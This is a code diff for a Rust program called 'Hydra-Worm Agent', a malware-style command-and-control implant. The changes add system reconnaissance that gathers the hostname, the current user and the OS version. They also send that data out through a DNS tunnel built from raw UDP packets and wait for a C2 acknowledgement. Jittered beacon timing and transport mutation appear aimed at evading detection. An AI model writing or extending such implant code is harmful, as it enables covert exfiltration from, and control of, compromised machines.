@@ -1,20 +1,17 @@
 // Project: Hydra-Worm Agent
-// Phase: 1.5 - Failsafe Stack Complete (Direct UDP DNS Patch)
-
-use std::{thread, time::Duration};
-use std::net::UdpSocket; 
+use std::{thread, time::Duration, net::UdpSocket};
 use rand::Rng;
 use rand::seq::SliceRandom;
 use rand_distr::{Distribution, Exp};
 use serde::{Serialize, Deserialize};
 use reqwest::header::{HeaderMap, HeaderValue, USER_AGENT};
 use base64::{Engine as _, engine::general_purpose};
+// Added for system recon
+use sysinfo::{System, User}; 
 
-// Raw Networking for ICMP
+// Cleaned up imports (Removed unused pnet::packet::Packet and pnet::util)
 use pnet::packet::icmp::echo_request::MutableEchoRequestPacket;
 use pnet::packet::icmp::IcmpTypes;
-use pnet::packet::Packet;
-use pnet::util;
 
 #[derive(Serialize, Clone)]
 struct Telemetry {
@@ -22,6 +19,10 @@ struct Telemetry {
     transport: String,
     status: String,
     lambda: f64,
+    // Phase 2.1: System Metadata
+    hostname: String,
+    username: String,
+    os: String,
 }
 
 #[derive(Deserialize)]
@@ -49,7 +50,6 @@ impl Transport for DnsTransport {
     fn send_heartbeat(&self, stats: &Telemetry) -> Result<C2Response, String> {
         let json_data = serde_json::to_string(stats).map_err(|e| e.to_string())?;
         
-        // Base64 must remain case-sensitive!
         let encoded = general_purpose::URL_SAFE_NO_PAD.encode(json_data);
         
         let chunks: Vec<String> = encoded
@@ -61,10 +61,8 @@ impl Transport for DnsTransport {
         let tunnel_query = format!("{}.{}", chunks.join("."), self.root_domain);
 
         let mut packet = Vec::new();
-        packet.extend_from_slice(&[0x13, 0x37]); 
-        packet.extend_from_slice(&[0x01, 0x00]); 
-        packet.extend_from_slice(&[0x00, 0x01]); 
-        packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x00, 0x00]); 
+        // Fixed DNS Header (Transaction ID 0x1337)
+        packet.extend_from_slice(&[0x13, 0x37, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]); 
 
         for part in tunnel_query.split('.') {
             if part.is_empty() { continue; }
@@ -72,13 +70,21 @@ impl Transport for DnsTransport {
             packet.extend_from_slice(part.as_bytes());
         }
         packet.push(0); 
-        packet.extend_from_slice(&[0x00, 0x01]); 
-        packet.extend_from_slice(&[0x00, 0x01]); 
+        packet.extend_from_slice(&[0x00, 0x01, 0x00, 0x01]); 
 
         let socket = UdpSocket::bind("0.0.0.0:0").map_err(|e| e.to_string())?;
+        
+        // Logic Fix: Set a 2-second timeout so the agent doesn't hang if C2 is offline
+        socket.set_read_timeout(Some(Duration::from_secs(2))).map_err(|e| e.to_string())?;
+        
         socket.send_to(&packet, "127.0.0.1:53").map_err(|e| e.to_string())?;
 
-        Ok(C2Response { status: "dns_tunneled".into(), task: "HIBERNATE".into(), epoch: 0 })
+        // Logic Fix: Wait for the Orchestrator to ACK before declaring success
+        let mut buf = [0u8; 512];
+        match socket.recv_from(&mut buf) {
+            Ok(_) => Ok(C2Response { status: "dns_verified".into(), task: "HIBERNATE".into(), epoch: 0 }),
+            Err(_) => Err("C2 DNS Listener Offline (No ACK)".into()),
+        }
     }
 
     fn get_name(&self) -> String { 
@@ -224,12 +230,37 @@ impl Agent {
     }
 
     fn run(&mut self) {
+        let mut sys = System::new_all();
+        sys.refresh_all();
+        
+        let hostname = System::host_name().unwrap_or_else(|| "unknown_host".into());
+        
+        // Logical Fix: Load the independent Users list
+        let user_list = sysinfo::Users::new_with_refreshed_list();
+        let current_pid = sysinfo::get_current_pid().unwrap();
+        
+        // Identify the ACTUAL user running this process
+        let username = sys.process(current_pid)
+            .and_then(|p| {
+                let uid = p.user_id()?;
+                user_list.iter().find(|u: &&sysinfo::User| u.id() == uid)
+            })
+            .map(|u: &sysinfo::User| u.name().to_string())
+            .unwrap_or_else(|| "unknown_user".into());
+            
+        let os_name = System::name().unwrap_or_default();
+        let os_ver = System::os_version().unwrap_or_default();
+        let os_info = format!("{} {}", os_name, os_ver);
+
         loop {
             let stats = Telemetry {
                 agent_id: self.id.clone(),
                 transport: self.transport.get_name(),
                 status: "OK".into(),
                 lambda: self.lambda,
+                hostname: hostname.clone(),
+                username: username.clone(),
+                os: os_info.clone(),
             };
 
             match self.transport.send_heartbeat(&stats) {
@@ -244,7 +275,9 @@ impl Agent {
             }
 
             if self.failures >= 3 { self.mutate(); }
-            let sleep_time = Exp::new(self.lambda).unwrap().sample(&mut rand::thread_rng()).min(60.0).max(1.0);
+            
+            let mut rng = rand::thread_rng();
+            let sleep_time = Exp::new(self.lambda).unwrap().sample(&mut rng).min(60.0).max(1.0);
             thread::sleep(Duration::from_secs_f64(sleep_time));
         }
     }
